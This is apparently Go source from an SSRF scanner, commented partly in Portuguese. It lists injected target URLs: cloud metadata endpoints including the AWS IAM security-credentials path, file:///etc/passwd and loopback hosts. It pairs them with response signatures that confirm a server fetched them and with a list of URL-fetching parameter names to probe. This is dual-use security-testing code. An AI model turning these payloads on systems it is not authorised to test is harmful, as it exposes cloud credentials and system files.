package main

import (
	"net/url"
	"regexp"
	"strings"
)

// ssrfTarget is one internal/well-known resource we ask the target server to
// fetch on our behalf. confirm(), when non-nil, looks at the response body
// for a signature that could ONLY appear if the server actually reached that
// resource — that's what turns "we injected a payload" into a confirmed
// finding instead of a guess. Targets without a confirm() func (none here
// currently — kept possible for future additions) fall back to the
// differential check in probe().
type ssrfTarget struct {
	Label   string // nome curto pro finding/evidência
	URL     string // valor injetado no parâmetro
	Sev     string // severidade quando confirmado
	confirm func(body string) bool
}

// awsMetaRe/etc match distinctive fragments of each service's real response
// body — chosen to be near-impossible to produce by coincidence from an
// unrelated page (a normal 404/error page won't contain 3 of these at once).
var (
	awsMetaKeys   = []string{"ami-id", "instance-id", "local-hostname", "security-credentials", "placement/", "public-keys"}
	gcpMetaKeys   = []string{"computeMetadata", "instance/service-accounts", "project/project-id"}
	azureMetaKeys = []string{"\"compute\"", "\"osType\"", "\"vmId\"", "azEnvironment"}
	etcPasswdRe   = regexp.MustCompile(`root:.*:0:0:`)
)

// stripReflected removes literal echoes of the injected payload URL from
// body before confirm() runs. Without this, a page that merely reflects the
// query string it was given (canonical link, __NEXT_DATA__, an error message
// quoting the bad URL) can self-confirm: some confirm() key sets share text
// with the payload itself (e.g. "security-credentials" and "computeMetadata"
// are both real metadata-response fragments AND substrings of the URL we
// inject to reach them), so a raw reflection satisfies countHits() without
// the target ever having fetched the internal resource.
func stripReflected(body, payload string) string {
	body = strings.ReplaceAll(body, payload, "")
	if esc := url.QueryEscape(payload); esc != payload {
		body = strings.ReplaceAll(body, esc, "")
	}
	if esc := url.PathEscape(payload); esc != payload {
		body = strings.ReplaceAll(body, esc, "")
	}
	return body
}

func countHits(body string, keys []string) int {
	n := 0
	for _, k := range keys {
		if strings.Contains(body, k) {
			n++
		}
	}
	return n
}

// SSRFTargets is the fixed set of internal resources tested against every
// candidate parameter. Order matters a little: cheaper/more common checks
// first, since probe() stops at the first confirmed hit per parameter.
func ssrfTargets() []ssrfTarget {
	return []ssrfTarget{
		{
			Label: "aws-metadata", URL: "http://169.254.169.254/latest/meta-data/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, awsMetaKeys) >= 2 },
		},
		{
			Label: "aws-metadata-iam-creds", URL: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, awsMetaKeys) >= 1 },
		},
		{
			Label: "file-etc-passwd", URL: "file:///etc/passwd", Sev: "critical",
			confirm: func(body string) bool { return etcPasswdRe.MatchString(body) },
		},
		{
			// GCP/Azure exigem um header (Metadata-Flavor / Metadata) que só o
			// app de destino manda — o atacante não controla isso injetando só
			// a URL. Ainda vale testar: alguns proxies/libs de fetch propagam
			// certos headers, e o custo de mais uma requisição é baixo.
			Label: "gcp-metadata", URL: "http://169.254.169.254/computeMetadata/v1/", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, gcpMetaKeys) >= 1 },
		},
		{
			Label: "azure-metadata", URL: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Sev: "critical",
			confirm: func(body string) bool { return countHits(body, azureMetaKeys) >= 2 },
		},
		// localhost/loopback não tem assinatura genérica de conteúdo — vira
		// candidato (probe() decide por diferencial contra o baseline), nunca
		// finding confirmado sozinho.
		{Label: "localhost", URL: "http://127.0.0.1/", Sev: "medium"},
		{Label: "localhost-name", URL: "http://localhost/", Sev: "medium"},
		{Label: "ipv6-loopback", URL: "http://[::1]/", Sev: "medium"},
	}
}

// builtinParams — nomes de parâmetro classicamente usados por código que
// busca uma URL no servidor (webhook, import, proxy, thumbnail, avatar por
// URL…). Difere da lista do scan-open-redirect: lá é "pra onde eu mando o
// usuário", aqui é "que URL o SERVIDOR vai buscar por mim".
var builtinParams = []string{
	"url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
	"continue", "return", "return_url", "callback", "webhook", "webhook_url",
	"notify_url", "feed", "feed_url", "source", "source_url", "src", "img",
	"image", "image_url", "avatar", "avatar_url", "thumbnail", "thumbnail_url",
	"preview", "preview_url", "proxy", "proxy_url", "fetch", "fetch_url",
	"load", "file", "document", "template", "host", "target", "to", "out",
	"link", "u", "resource", "endpoint", "api_url", "site", "domain",
}
